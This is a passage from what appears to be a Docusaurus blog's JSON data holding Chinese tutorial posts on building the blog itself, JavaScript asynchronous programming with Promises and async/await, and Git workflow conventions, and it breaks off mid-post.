<BrowserOnly>\\n      {() => {\\n        const { colorMode } = useColorMode();\\n        return (\\n          <Giscus\\n            repo=\\"your-username/your-repo\\"\\n            repoId=\\"your-repo-id\\"\\n            category=\\"Announcements\\"\\n            categoryId=\\"your-category-id\\"\\n            mapping=\\"pathname\\"\\n            theme={colorMode === \'dark\' ? \'dark\' : \'light\'}\\n            lang=\\"zh-CN\\"\\n          />\\n        );\\n      }}\\n    </BrowserOnly>\\n  );\\n}\\n```\\n\\n### 3. \u9605\u8bfb\u8fdb\u5ea6\u6761\\n\\n```tsx\\n// src/components/ReadingProgress/index.tsx\\nimport { useState, useEffect } from \'react\';\\nimport styles from \'./styles.module.css\';\\n\\nexport default function ReadingProgress() {\\n  const [progress, setProgress] = useState(0);\\n\\n  useEffect(() => {\\n    const updateProgress = () => {\\n      const scrollTop = window.scrollY;\\n      const docHeight = document.documentElement.scrollHeight - window.innerHeight;\\n      setProgress(docHeight > 0 ? (scrollTop / docHeight) * 100 : 0);\\n    };\\n\\n    window.addEventListener(\'scroll\', updateProgress);\\n    return () => window.removeEventListener(\'scroll\', updateProgress);\\n  }, []);\\n\\n  return <div className={styles.progress} style={{ width: `${progress}%` }} />;\\n}\\n```\\n\\n### 4. \u8fd4\u56de\u9876\u90e8\u6309\u94ae\\n\\n```tsx\\n// src/components/BackToTop/index.tsx\\nexport default function BackToTop() {\\n  const [visible, setVisible] = useState(false);\\n\\n  useEffect(() => {\\n    const toggleVisible = () => setVisible(window.scrollY > 300);\\n    window.addEventListener(\'scroll\', toggleVisible);\\n    return () => window.removeEventListener(\'scroll\', toggleVisible);\\n  }, []);\\n\\n  const scrollToTop = () => {\\n    window.scrollTo({ top: 0, behavior: \'smooth\' });\\n  };\\n\\n  if (!visible) return null;\\n\\n  return (\\n    <button className={styles.backToTop} onClick={scrollToTop}>\\n      \u2191\\n    </button>\\n  );\\n}\\n```\\n\\n---\\n\\n## \ud83d\ude80 \u90e8\u7f72\u5230 GitHub Pages\\n\\n### 1. \u914d\u7f6e GitHub Actions\\n\\n```yaml\\n# .github/workflows/deploy.yml\\nname: Deploy to GitHub Pages\\n\\non:\\n  push:\\n    branches: [main]\\n\\njobs:\\n  build-and-deploy:\\n    runs-on: ubuntu-latest\\n    steps:\\n      - uses: actions/checkout@v4\\n      \\n      - name: Setup Node.js\\n        uses: actions/setup-node@v4\\n        with:\\n          node-version: 20\\n          cache: yarn\\n          \\n      - name: Install dependencies\\n        run: yarn install --frozen-lockfile\\n        \\n      - name: Build\\n        run: yarn build\\n        \\n      - name: Deploy\\n        uses: peaceiris/actions-gh-pages@v3\\n        with:\\n          github_token: ${{ secrets.GITHUB_TOKEN }}\\n          publish_dir: ./build\\n```\\n\\n### 2. \u914d\u7f6e\u4ed3\u5e93\\n\\n1. \u8fdb\u5165\u4ed3\u5e93 Settings > Pages\\n2. Source \u9009\u62e9 `gh-pages` \u5206\u652f\\n3. \u4fdd\u5b58\u540e\u7b49\u5f85\u90e8\u7f72\u5b8c\u6210\\n\\n### 3. \u81ea\u5b9a\u4e49\u57df\u540d\uff08\u53ef\u9009\uff09\\n\\n```\\n# static/CNAME\\nyour-domain.com\\n```\\n\\n---\\n\\n## \ud83d\udcdd \u5199\u4f5c\u6280\u5de7\\n\\n### 1. \u535a\u5ba2\u6587\u7ae0\u683c\u5f0f\\n\\n```markdown\\n---\\nslug: my-first-post\\ntitle: \u6211\u7684\u7b2c\u4e00\u7bc7\u535a\u5ba2\\nauthors: mason\\ntags: [\u6807\u7b7e1, \u6807\u7b7e2]\\n---\\n\\n\u6587\u7ae0\u6458\u8981\uff0c\u4f1a\u663e\u793a\u5728\u5217\u8868\u9875\u3002\\n\\n\x3c!--truncate--\x3e\\n\\n\u6b63\u6587\u5185\u5bb9...\\n```\\n\\n### 2. \u4f7f\u7528 Admonitions\\n\\n```markdown\\n:::tip \u63d0\u793a\\n\u8fd9\u662f\u4e00\u4e2a\u63d0\u793a\u4fe1\u606f\\n:::\\n\\n:::warning \u8b66\u544a\\n\u8fd9\u662f\u4e00\u4e2a\u8b66\u544a\u4fe1\u606f\\n:::\\n\\n:::danger \u5371\u9669\\n\u8fd9\u662f\u4e00\u4e2a\u5371\u9669\u8b66\u544a\\n:::\\n```\\n\\n### 3. \u4f7f\u7528 MDX \u7ec4\u4ef6\\n\\nMDX \u5141\u8bb8\u5728 Markdown \u4e2d\u4f7f\u7528 React \u7ec4\u4ef6\uff1a\\n\\n```javascript\\n// \u5bfc\u5165\u7ec4\u4ef6\\nimport Tabs from \'@theme/Tabs\';\\nimport TabItem from \'@theme/TabItem\';\\n\\n// \u5728\u6587\u6863\u4e2d\u4f7f\u7528 Tabs \u7ec4\u4ef6\u5b9e\u73b0\u591a\u8bed\u8a00\u4ee3\u7801\u5207\u6362\\n```\\n\\n\u5e38\u7528 MDX \u529f\u80fd\uff1a\\n- **Tabs** - \u591a\u6807\u7b7e\u9875\u5207\u6362\\n- **CodeBlock** - \u81ea\u5b9a\u4e49\u4ee3\u7801\u5757\\n- **Details** - \u53ef\u6298\u53e0\u5185\u5bb9\\n- **Admonitions** - \u63d0\u793a/\u8b66\u544a\u6846\\n\\n---\\n\\n## \ud83d\udd27 \u5e38\u89c1\u95ee\u9898\\n\\n### 1. \u6784\u5efa\u5931\u8d25\uff1a\u7aef\u53e3\u88ab\u5360\u7528\\n\\n```bash\\nlsof -ti:3000 | xargs kill -9\\nyarn start\\n```\\n\\n### 2. \u56fe\u7247\u65e0\u6cd5\u663e\u793a\\n\\n\u786e\u4fdd\u56fe\u7247\u653e\u5728 `static` \u76ee\u5f55\u4e0b\uff0c\u4f7f\u7528\u7edd\u5bf9\u8def\u5f84\u5f15\u7528\uff1a\\n\\n```markdown\\n![\u56fe\u7247](/img/my-image.png)\\n```\\n\\n### 3. \u4e2d\u6587\u641c\u7d22\u4e0d\u751f\u6548\\n\\n\u786e\u4fdd\u641c\u7d22\u63d2\u4ef6\u914d\u7f6e\u4e86\u4e2d\u6587\u8bed\u8a00\uff1a\\n\\n```typescript\\nlanguage: [\'en\', \'zh\'],\\n```\\n\\n---\\n\\n## \ud83d\udccb \u4e0a\u7ebf\u68c0\u67e5\u6e05\u5355\\n\\n| \u68c0\u67e5\u9879 | \u72b6\u6001 |\\n|--------|------|\\n| \u57fa\u7840\u914d\u7f6e\u5b8c\u6210 | \u2705 |\\n| \u81ea\u5b9a\u4e49\u4e3b\u9898 | \u2705 |\\n| \u672c\u5730\u641c\u7d22 | \u2705 |\\n| \u8bc4\u8bba\u7cfb\u7edf | \u2705 |\\n| \u9605\u8bfb\u589e\u5f3a | \u2705 |\\n| GitHub Actions | \u2705 |\\n| \u81ea\u5b9a\u4e49\u57df\u540d | \u2b1c |\\n\\n---\\n\\n\u5e0c\u671b\u8fd9\u7bc7\u6587\u7ae0\u80fd\u5e2e\u52a9\u4f60\u642d\u5efa\u81ea\u5df1\u7684\u6280\u672f\u535a\u5ba2\u3002\u5982\u679c\u6709\u4efb\u4f55\u95ee\u9898\uff0c\u6b22\u8fce\u5728\u8bc4\u8bba\u533a\u8ba8\u8bba\uff01"},{"id":"async-javascript","metadata":{"permalink":"/blog/async-javascript","editUrl":"https://github.com/hweos/git-pages/edit/main/blog/2024-02-20-async-javascript.md","source":"@site/blog/2024-02-20-async-javascript.md","title":"JavaScript \u5f02\u6b65\u7f16\u7a0b\u8fdb\u9636","description":"\u5f02\u6b65\u7f16\u7a0b\u662f JavaScript \u7684\u6838\u5fc3\u7279\u6027\u3002\u672c\u6587\u4ece\u539f\u7406\u5230\u5b9e\u8df5\uff0c\u5e26\u4f60\u6df1\u5165\u7406\u89e3 Promise \u548c async/await\u3002","date":"2024-02-20T00:00:00.000Z","tags":[{"inline":true,"label":"JavaScript","permalink":"/blog/tags/java-script"},{"inline":true,"label":"\u5f02\u6b65","permalink":"/blog/tags/\u5f02\u6b65"},{"inline":true,"label":"Promise","permalink":"/blog/tags/promise"}],"readingTime":4.58,"hasTruncateMarker":true,"authors":[{"name":"Mason","title":"Full Stack Developer","url":"https://github.com/HuangZhe007","socials":{"github":"https://github.com/HuangZhe007"},"imageURL":"https://avatars.githubusercontent.com/u/45168628?v=4","key":"mason","page":null}],"frontMatter":{"slug":"async-javascript","title":"JavaScript \u5f02\u6b65\u7f16\u7a0b\u8fdb\u9636","authors":"mason","tags":["JavaScript","\u5f02\u6b65","Promise"]},"unlisted":false,"prevItem":{"title":"\u4ece 0 \u5230 1 \u642d\u5efa Docusaurus \u535a\u5ba2","permalink":"/blog/build-docusaurus-blog"},"nextItem":{"title":"Git \u5de5\u4f5c\u6d41\u6700\u4f73\u5b9e\u8df5","permalink":"/blog/git-workflow"}},"content":"\u5f02\u6b65\u7f16\u7a0b\u662f JavaScript \u7684\u6838\u5fc3\u7279\u6027\u3002\u672c\u6587\u4ece\u539f\u7406\u5230\u5b9e\u8df5\uff0c\u5e26\u4f60\u6df1\u5165\u7406\u89e3 Promise \u548c async/await\u3002\\n\\n\x3c!--truncate--\x3e\\n\\n## \ud83d\udd04 \u4e3a\u4ec0\u4e48\u9700\u8981\u5f02\u6b65\\n\\nJavaScript \u662f\u5355\u7ebf\u7a0b\u8bed\u8a00\uff0c\u5982\u679c\u6240\u6709\u64cd\u4f5c\u90fd\u540c\u6b65\u6267\u884c\uff0c\u9047\u5230\u8017\u65f6\u64cd\u4f5c\uff08\u7f51\u7edc\u8bf7\u6c42\u3001\u6587\u4ef6\u8bfb\u5199\uff09\u65f6\uff0c\u9875\u9762\u5c31\u4f1a\u5361\u4f4f\u3002\\n\\n```javascript\\n// \u5982\u679c\u662f\u540c\u6b65\u7684\u8bdd...\\nconst data = fetchData();  // \u7b49\u5f85 3 \u79d2\\nconsole.log(data);         // \u9875\u9762\u5361\u4f4f 3 \u79d2\u624d\u6267\u884c\\n```\\n\\n\u5f02\u6b65\u7f16\u7a0b\u8ba9\u6211\u4eec\u80fd\u591f\uff1a\\n- \u4e0d\u963b\u585e\u4e3b\u7ebf\u7a0b\\n- \u540c\u65f6\u5904\u7406\u591a\u4e2a\u4efb\u52a1\\n- \u4fdd\u6301\u9875\u9762\u54cd\u5e94\\n\\n---\\n\\n## \ud83d\udcda \u5f02\u6b65\u6f14\u8fdb\u53f2\\n\\n### 1. \u56de\u8c03\u51fd\u6570\uff08Callback\uff09\\n\\n```javascript\\n// \u56de\u8c03\u5730\u72f1\\ngetData(function(a) {\\n  getMoreData(a, function(b) {\\n    getMoreData(b, function(c) {\\n      getMoreData(c, function(d) {\\n        console.log(d);\\n      });\\n    });\\n  });\\n});\\n```\\n\\n**\u95ee\u9898**\uff1a\u56de\u8c03\u5730\u72f1\u3001\u9519\u8bef\u5904\u7406\u56f0\u96be\u3001\u4ee3\u7801\u96be\u4ee5\u7ef4\u62a4\\n\\n### 2. Promise\\n\\n```javascript\\ngetData()\\n  .then(a => getMoreData(a))\\n  .then(b => getMoreData(b))\\n  .then(c => getMoreData(c))\\n  .then(d => console.log(d))\\n  .catch(err => console.error(err));\\n```\\n\\n**\u4f18\u70b9**\uff1a\u94fe\u5f0f\u8c03\u7528\u3001\u7edf\u4e00\u7684\u9519\u8bef\u5904\u7406\\n\\n### 3. async/await\\n\\n```javascript\\nasync function fetchAll() {\\n  try {\\n    const a = await getData();\\n    const b = await getMoreData(a);\\n    const c = await getMoreData(b);\\n    const d = await getMoreData(c);\\n    console.log(d);\\n  } catch (err) {\\n    console.error(err);\\n  }\\n}\\n```\\n\\n**\u4f18\u70b9**\uff1a\u540c\u6b65\u5199\u6cd5\u3001\u76f4\u89c2\u6613\u8bfb\\n\\n---\\n\\n## \ud83c\udfaf Promise \u6df1\u5165\u7406\u89e3\\n\\n### Promise \u7684\u4e09\u79cd\u72b6\u6001\\n\\n```javascript\\n// pending -> fulfilled\\nconst p1 = new Promise((resolve) => {\\n  setTimeout(() => resolve(\'\u6210\u529f\'), 1000);\\n});\\n\\n// pending -> rejected\\nconst p2 = new Promise((_, reject) => {\\n  setTimeout(() => reject(\'\u5931\u8d25\'), 1000);\\n});\\n```\\n\\n```\\npending\uff08\u8fdb\u884c\u4e2d\uff09\\n    \u251c\u2500\u2500 fulfilled\uff08\u5df2\u6210\u529f\uff09\\n    \u2514\u2500\u2500 rejected\uff08\u5df2\u5931\u8d25\uff09\\n```\\n\\n### \u624b\u5199\u7b80\u6613 Promise\\n\\n```javascript\\nclass MyPromise {\\n  constructor(executor) {\\n    this.state = \'pending\';\\n    this.value = undefined;\\n    this.callbacks = [];\\n\\n    const resolve = (value) => {\\n      if (this.state !== \'pending\') return;\\n      this.state = \'fulfilled\';\\n      this.value = value;\\n      this.callbacks.forEach(cb => cb.onFulfilled(value));\\n    };\\n\\n    const reject = (reason) => {\\n      if (this.state !== \'pending\') return;\\n      this.state = \'rejected\';\\n      this.value = reason;\\n      this.callbacks.forEach(cb => cb.onRejected(reason));\\n    };\\n\\n    try {\\n      executor(resolve, reject);\\n    } catch (err) {\\n      reject(err);\\n    }\\n  }\\n\\n  then(onFulfilled, onRejected) {\\n    return new MyPromise((resolve, reject) => {\\n      const handle = (callback, resolveOrReject) => {\\n        try {\\n          const result = callback(this.value);\\n          if (result instanceof MyPromise) {\\n            result.then(resolve, reject);\\n          } else {\\n            resolveOrReject(result);\\n          }\\n        } catch (err) {\\n          reject(err);\\n        }\\n      };\\n\\n      if (this.state === \'fulfilled\') {\\n        setTimeout(() => handle(onFulfilled, resolve));\\n      } else if (this.state === \'rejected\') {\\n        setTimeout(() => handle(onRejected, reject));\\n      } else {\\n        this.callbacks.push({\\n          onFulfilled: () => handle(onFulfilled, resolve),\\n          onRejected: () => handle(onRejected, reject),\\n        });\\n      }\\n    });\\n  }\\n}\\n```\\n\\n---\\n\\n## \ud83d\udd27 Promise \u9759\u6001\u65b9\u6cd5\\n\\n### Promise.all - \u5168\u90e8\u6210\u529f\\n\\n```javascript\\nconst promises = [\\n  fetch(\'/api/user\'),\\n  fetch(\'/api/posts\'),\\n  fetch(\'/api/comments\')\\n];\\n\\n// \u5168\u90e8\u6210\u529f\u624d\u8fd4\u56de\uff0c\u4efb\u4e00\u5931\u8d25\u5219\u5931\u8d25\\nconst [user, posts, comments] = await Promise.all(promises);\\n```\\n\\n### Promise.allSettled - \u83b7\u53d6\u6240\u6709\u7ed3\u679c\\n\\n```javascript\\nconst results = await Promise.allSettled(promises);\\n\\nresults.forEach(result => {\\n  if (result.status === \'fulfilled\') {\\n    console.log(\'\u6210\u529f:\', result.value);\\n  } else {\\n    console.log(\'\u5931\u8d25:\', result.reason);\\n  }\\n});\\n```\\n\\n### Promise.race - \u7ade\u901f\\n\\n```javascript\\n// \u8d85\u65f6\u63a7\u5236\\nconst timeout = new Promise((_, reject) => \\n  setTimeout(() => reject(\'\u8d85\u65f6\'), 5000)\\n);\\n\\ntry {\\n  const data = await Promise.race([fetchData(), timeout]);\\n  console.log(data);\\n} catch (err) {\\n  console.error(err);  // \'\u8d85\u65f6\'\\n}\\n```\\n\\n### Promise.any - \u4efb\u4e00\u6210\u529f\\n\\n```javascript\\n// \u591a\u4e2a\u5907\u7528\u6e90\uff0c\u53d6\u6700\u5feb\u6210\u529f\u7684\\nconst data = await Promise.any([\\n  fetch(\'https://api1.example.com/data\'),\\n  fetch(\'https://api2.example.com/data\'),\\n  fetch(\'https://api3.example.com/data\')\\n]);\\n```\\n\\n---\\n\\n## \u26a1 async/await \u6700\u4f73\u5b9e\u8df5\\n\\n### 1. \u5e76\u884c\u6267\u884c\\n\\n```javascript\\n// \u274c \u4e32\u884c\u6267\u884c\uff0c\u6162\\nasync function fetchData() {\\n  const user = await fetchUser();      // 1\u79d2\\n  const posts = await fetchPosts();    // 1\u79d2\\n  const comments = await fetchComments(); // 1\u79d2\\n  // \u603b\u5171 3 \u79d2\\n}\\n\\n// \u2705 \u5e76\u884c\u6267\u884c\uff0c\u5feb\\nasync function fetchData() {\\n  const [user, posts, comments] = await Promise.all([\\n    fetchUser(),\\n    fetchPosts(),\\n    fetchComments()\\n  ]);\\n  // \u603b\u5171\u7ea6 1 \u79d2\\n}\\n```\\n\\n### 2. \u9519\u8bef\u5904\u7406\\n\\n```javascript\\n// \u65b9\u5f0f1\uff1atry-catch\\nasync function fetchData() {\\n  try {\\n    const data = await fetch(\'/api/data\');\\n    return data.json();\\n  } catch (err) {\\n    console.error(\'\u8bf7\u6c42\u5931\u8d25:\', err);\\n    return null;\\n  }\\n}\\n\\n// \u65b9\u5f0f2\uff1a\u5305\u88c5\u51fd\u6570\\nasync function to(promise) {\\n  try {\\n    const data = await promise;\\n    return [null, data];\\n  } catch (err) {\\n    return [err, null];\\n  }\\n}\\n\\n// \u4f7f\u7528\\nconst [err, data] = await to(fetchData());\\nif (err) {\\n  console.error(err);\\n}\\n```\\n\\n### 3. \u5faa\u73af\u4e2d\u7684\u5f02\u6b65\\n\\n```javascript\\n// \u274c forEach \u4e0d\u4f1a\u7b49\u5f85\\nurls.forEach(async (url) => {\\n  await fetch(url);  // \u4e0d\u4f1a\u7b49\u5f85\\n});\\nconsole.log(\'\u5b8c\u6210\');  // \u7acb\u5373\u6267\u884c\\n\\n// \u2705 for...of \u4f1a\u7b49\u5f85\\nfor (const url of urls) {\\n  await fetch(url);\\n}\\nconsole.log(\'\u5b8c\u6210\');  // \u5168\u90e8\u8bf7\u6c42\u5b8c\u6210\u540e\u6267\u884c\\n\\n// \u2705 \u5e76\u884c\u5904\u7406\\nawait Promise.all(urls.map(url => fetch(url)));\\nconsole.log(\'\u5b8c\u6210\');\\n```\\n\\n### 4. \u7acb\u5373\u6267\u884c\u7684 async \u51fd\u6570\\n\\n```javascript\\n// IIFE \u5199\u6cd5\\n(async () => {\\n  const data = await fetchData();\\n  console.log(data);\\n})();\\n\\n// \u9876\u5c42 await\uff08ES2022+\uff0c\u6a21\u5757\u4e2d\u53ef\u7528\uff09\\nconst data = await fetchData();\\nconsole.log(data);\\n```\\n\\n---\\n\\n## \ud83d\udd04 Event Loop \u4e0e\u5fae\u4efb\u52a1\\n\\n### \u6267\u884c\u987a\u5e8f\\n\\n```javascript\\nconsole.log(\'1\');\\n\\nsetTimeout(() => {\\n  console.log(\'2\');\\n}, 0);\\n\\nPromise.resolve().then(() => {\\n  console.log(\'3\');\\n});\\n\\nconsole.log(\'4\');\\n\\n// \u8f93\u51fa: 1 4 3 2\\n```\\n\\n**\u6267\u884c\u987a\u5e8f**\uff1a\\n1. \u540c\u6b65\u4ee3\u7801\\n2. \u5fae\u4efb\u52a1\uff08Promise.then\u3001queueMicrotask\uff09\\n3. \u5b8f\u4efb\u52a1\uff08setTimeout\u3001setInterval\uff09\\n\\n### \u5fae\u4efb\u52a1 vs \u5b8f\u4efb\u52a1\\n\\n| \u7c7b\u578b | \u793a\u4f8b |\\n|------|------|\\n| \u5fae\u4efb\u52a1 | Promise.then\u3001async/await\u3001queueMicrotask |\\n| \u5b8f\u4efb\u52a1 | setTimeout\u3001setInterval\u3001setImmediate\u3001I/O |\\n\\n---\\n\\n## \ud83d\udca1 \u5b9e\u6218\u6280\u5de7\\n\\n### 1. \u8bf7\u6c42\u91cd\u8bd5\\n\\n```javascript\\nasync function fetchWithRetry(url, retries = 3) {\\n  for (let i = 0; i < retries; i++) {\\n    try {\\n      return await fetch(url);\\n    } catch (err) {\\n      if (i === retries - 1) throw err;\\n      await sleep(1000 * Math.pow(2, i));  // \u6307\u6570\u9000\u907f\\n    }\\n  }\\n}\\n\\nconst sleep = ms => new Promise(r => setTimeout(r, ms));\\n```\\n\\n### 2. \u5e76\u53d1\u63a7\u5236\\n\\n```javascript\\nasync function asyncPool(limit, items, fn) {\\n  const results = [];\\n  const executing = [];\\n\\n  for (const item of items) {\\n    const p = Promise.resolve().then(() => fn(item));\\n    results.push(p);\\n\\n    if (items.length >= limit) {\\n      const e = p.then(() => executing.splice(executing.indexOf(e), 1));\\n      executing.push(e);\\n      if (executing.length >= limit) {\\n        await Promise.race(executing);\\n      }\\n    }\\n  }\\n\\n  return Promise.all(results);\\n}\\n\\n// \u4f7f\u7528\uff1a\u6700\u591a 3 \u4e2a\u5e76\u53d1\\nawait asyncPool(3, urls, url => fetch(url));\\n```\\n\\n### 3. \u53d6\u6d88\u8bf7\u6c42\\n\\n```javascript\\nconst controller = new AbortController();\\n\\nfetch(\'/api/data\', { signal: controller.signal })\\n  .then(res => res.json())\\n  .catch(err => {\\n    if (err.name === \'AbortError\') {\\n      console.log(\'\u8bf7\u6c42\u88ab\u53d6\u6d88\');\\n    }\\n  });\\n\\n// \u53d6\u6d88\u8bf7\u6c42\\ncontroller.abort();\\n```\\n\\n---\\n\\n## \ud83d\udccb \u603b\u7ed3\\n\\n| \u573a\u666f | \u63a8\u8350\u65b9\u6848 |\\n|------|---------|\\n| \u591a\u4e2a\u72ec\u7acb\u8bf7\u6c42 | `Promise.all` \u5e76\u884c |\\n| \u9700\u8981\u6240\u6709\u7ed3\u679c | `Promise.allSettled` |\\n| \u7ade\u901f/\u8d85\u65f6\u63a7\u5236 | `Promise.race` |\\n| \u4efb\u4e00\u6210\u529f\u5373\u53ef | `Promise.any` |\\n| \u987a\u5e8f\u6267\u884c | `for...of` + await |\\n| \u9519\u8bef\u5904\u7406 | try-catch \u6216 .catch() |\\n\\n\u638c\u63e1\u5f02\u6b65\u7f16\u7a0b\u662f\u6210\u4e3a JavaScript \u9ad8\u624b\u7684\u5fc5\u7ecf\u4e4b\u8def\u3002\u5e0c\u671b\u8fd9\u7bc7\u6587\u7ae0\u80fd\u5e2e\u52a9\u4f60\u66f4\u6df1\u5165\u5730\u7406\u89e3\u8fd9\u4e2a\u4e3b\u9898\uff01"},{"id":"git-workflow","metadata":{"permalink":"/blog/git-workflow","editUrl":"https://github.com/hweos/git-pages/edit/main/blog/2024-02-01-git-workflow.md","source":"@site/blog/2024-02-01-git-workflow.md","title":"Git \u5de5\u4f5c\u6d41\u6700\u4f73\u5b9e\u8df5","description":"\u4e00\u4e2a\u597d\u7684 Git \u5de5\u4f5c\u6d41\u80fd\u8ba9\u56e2\u961f\u534f\u4f5c\u66f4\u52a0\u987a\u7545\u3002\u672c\u6587\u5206\u4eab\u6211\u5728\u56e2\u961f\u4e2d\u5b9e\u8df5\u7684 Git \u5de5\u4f5c\u6d41\u548c\u89c4\u8303\u3002","date":"2024-02-01T00:00:00.000Z","tags":[{"inline":true,"label":"Git","permalink":"/blog/tags/git"},{"inline":true,"label":"\u56e2\u961f\u534f\u4f5c","permalink":"/blog/tags/\u56e2\u961f\u534f\u4f5c"},{"inline":true,"label":"\u5de5\u4f5c\u6d41","permalink":"/blog/tags/\u5de5\u4f5c\u6d41"}],"readingTime":4.34,"hasTruncateMarker":true,"authors":[{"name":"Mason","title":"Full Stack Developer","url":"https://github.com/HuangZhe007","socials":{"github":"https://github.com/HuangZhe007"},"imageURL":"https://avatars.githubusercontent.com/u/45168628?v=4","key":"mason","page":null}],"frontMatter":{"slug":"git-workflow","title":"Git \u5de5\u4f5c\u6d41\u6700\u4f73\u5b9e\u8df5","authors":"mason","tags":["Git","\u56e2\u961f\u534f\u4f5c","\u5de5\u4f5c\u6d41"]},"unlisted":false,"prevItem":{"title":"JavaScript \u5f02\u6b65\u7f16\u7a0b\u8fdb\u9636","permalink":"/blog/async-javascript"},"nextItem":{"title":"React \u6027\u80fd\u4f18\u5316\u5b9e\u6218\u6307\u5357","permalink":"/blog/react-performance"}},"content":"\u4e00\u4e2a\u597d\u7684 Git \u5de5\u4f5c\u6d41\u80fd\u8ba9\u56e2\u961f\u534f\u4f5c\u66f4\u52a0\u987a\u7545\u3002\u672c\u6587\u5206\u4eab\u6211\u5728\u56e2\u961f\u4e2d\u5b9e\u8df5\u7684 Git \u5de5\u4f5c\u6d41\u548c\u89c4\u8303\u3002\\n\\n\x3c!--truncate--\x3e\\n\\n## \ud83c\udf3f \u5206\u652f\u7b56\u7565\\n\\n### \u63a8\u8350\uff1aGitHub Flow\uff08\u7b80\u5316\u7248\uff09\\n\\n\u9002\u5408\u6301\u7eed\u90e8\u7f72\u7684\u9879\u76ee\uff0c\u7b80\u5355\u9ad8\u6548\uff1a\\n\\n```\\nmain \u2500\u2500\u2500\u2500\u2500\u25cf\u2500\u2500\u2500\u2500\u2500\u25cf\u2500\u2500\u2500\u2500\u2500\u25cf\u2500\u2500\u2500\u2500\u2500\u25cf\u2500\u2500\u2500\u2500\u2500\u25cf\u2500\u2500\u2500\u2500\u2192\\n           \\\\         /     \\\\     /\\nfeature-A   \u25cf\u2500\u2500\u2500\u25cf\u2500\u2500\u2500\u25cf       \\\\   /\\n                             \\\\ /\\nfeature-B           \u25cf\u2500\u2500\u2500\u2500\u2500\u25cf\u2500\u2500\u2500\u25cf\\n```\\n\\n**\u6838\u5fc3\u89c4\u5219**\uff1a\\n1. `main` \u5206\u652f\u59cb\u7ec8\u53ef\u90e8\u7f72\\n2. \u65b0\u529f\u80fd\u4ece `main` \u521b\u5efa\u5206\u652f\\n3. \u901a\u8fc7 Pull Request \u5408\u5e76\\n4. \u5408\u5e76\u540e\u7acb\u5373\u90e8\u7f72\\n\\n### \u5206\u652f\u547d\u540d\u89c4\u8303\\n\\n```bash\\n# \u529f\u80fd\u5f00\u53d1\\nfeature/user-login\\nfeature/shopping-cart\\n\\n# Bug \u4fee\u590d\\nfix/login-error\\nfix/payment-timeout\\n\\n# \u70ed\u4fee\u590d\\nhotfix/security-patch\\n\\n# \u91cd\u6784\\nrefactor/api-layer\\n\\n# \u6587\u6863\\ndocs/api-documentation\\n```\\n\\n---\\n\\n## \ud83d\udcdd Commit \u89c4\u8303\\n\\n### Conventional Commits\\n\\n```\\n<type>(<scope>): <subject>\\n\\n<body>\\n\\n<footer>\\n```\\n\\n### \u5e38\u7528 Type\\n\\n| Type | \u8bf4\u660e | \u793a\u4f8b |\\n|------|------|------|\\n| `feat` | \u65b0\u529f\u80fd | feat: \u6dfb\u52a0\u7528\u6237\u767b\u5f55\u529f\u80fd |\\n| `fix` | Bug \u4fee\u590d | fix: \u4fee\u590d\u767b\u5f55\u6309\u94ae\u70b9\u51fb\u65e0\u54cd\u5e94 |\\n| `docs` | \u6587\u6863\u66f4\u65b0 | docs: \u66f4\u65b0 API \u6587\u6863 |\\n| `style` | \u4ee3\u7801\u683c\u5f0f | style: \u683c\u5f0f\u5316\u4ee3\u7801 |\\n| `refactor` | \u91cd\u6784 | refactor: \u91cd\u6784\u7528\u6237\u6a21\u5757 |\\n| `perf` | \u6027\u80fd\u4f18\u5316 | perf: \u4f18\u5316\u5217\u8868\u6e32\u67d3\u6027\u80fd |\\n| `test` | \u6d4b\u8bd5\u76f8\u5173 | test: \u6dfb\u52a0\u767b\u5f55\u5355\u5143\u6d4b\u8bd5 |\\n| `chore` | \u6784\u5efa/\u5de5\u5177 | chore: \u5347\u7ea7\u4f9d\u8d56\u7248\u672c |\\n\\n### \u597d\u7684 Commit Message\\n\\n```bash\\n# \u2705 \u597d\u7684\u793a\u4f8b\\nfeat(auth): \u5b9e\u73b0 JWT \u767b\u5f55\u8ba4\u8bc1\\n\\n- \u6dfb\u52a0 login/logout API\\n- \u96c6\u6210 JWT token \u9a8c\u8bc1\\n- \u6dfb\u52a0\u767b\u5f55\u72b6\u6001\u6301\u4e45\u5316\\n\\nCloses #123\\n\\n# \u274c \u4e0d\u597d\u7684\u793a\u4f8b\\nfix bug\\nupdate code\\nWIP\\nasdfgh\\n```\\n\\n### \u914d\u7f6e Commitlint\\n\\n```bash\\nnpm install -D @commitlint/cli @commitlint/config-conventional\\n```\\n\\n```javascript\\n// commitlint.config.js\\nmodule.exports = {\\n  extends: [\'@commitlint/config-conventional\'],\\n  rules: {\\n    \'subject-case\': [0],  // \u5141\u8bb8\u4e2d\u6587\\n  },\\n};\\n```\\n\\n---\\n\\n## \ud83d\udd04 \u5de5\u4f5c\u6d41\u7a0b\\n\\n### 1. \u5f00\u59cb\u65b0\u529f\u80fd\\n\\n```bash\\n# \u786e\u4fdd main \u662f\u6700\u65b0\u7684\\ngit checkout main\\ngit pull origin main\\n\\n# \u521b\u5efa\u529f\u80fd\u5206\u652f\\ngit checkout -b feature/new-feature\\n```\\n\\n### 2. \u5f00\u53d1\u8fc7\u7a0b\\n\\n```bash\\n# \u5c0f\u6b65\u63d0\u4ea4\\ngit add .\\ngit commit -m \\"feat: \u5b8c\u6210\u7528\u6237\u8868\u5355\u9a8c\u8bc1\\"\\n\\n# \u5b9a\u671f\u540c\u6b65 main\\ngit fetch origin\\ngit rebase origin/main\\n```\\n\\n### 3. \u51c6\u5907\u5408\u5e76\\n\\n```bash\\n# \u6574\u7406\u63d0\u4ea4\u5386\u53f2\uff08\u53ef\u9009\uff09\\ngit rebase -i HEAD~3\\n\\n# \u63a8\u9001\u5206\u652f\\ngit push origin feature/new-feature -u\\n```\\n\\n### 4. \u521b\u5efa Pull Request\\n\\n- \u586b\u5199\u6e05\u6670\u7684\u63cf\u8ff0\\n- \u5173\u8054\u76f8\u5173 Issue\\n- \u8bf7\u6c42 Code Review\\n- \u786e\u4fdd CI \u901a\u8fc7\\n\\n### 5. \u5408\u5e76\u540e\u6e05\u7406\\n\\n```bash\\n# \u5220\u9664\u672c\u5730\u5206\u652f\\ngit branch -d feature/new-feature\\n\\n# \u5220\u9664\u8fdc\u7a0b\u5206\u652f\uff08\u5982\u679c\u9700\u8981\uff09\\ngit push origin --delete feature/new-feature\\n```\\n\\n---\\n\\n## \ud83d\udd0d Code Review \u5b9e\u8df5\\n\\n### \u4f5c\u4e3a\u63d0\u4ea4\u8005\\n\\n1. **\u81ea\u6211 Review** - \u63d0\u4ea4\u524d\u5148\u81ea\u5df1\u68c0\u67e5\u4e00\u904d\\n2. **\u5c0f\u800c\u4e13\u6ce8** - 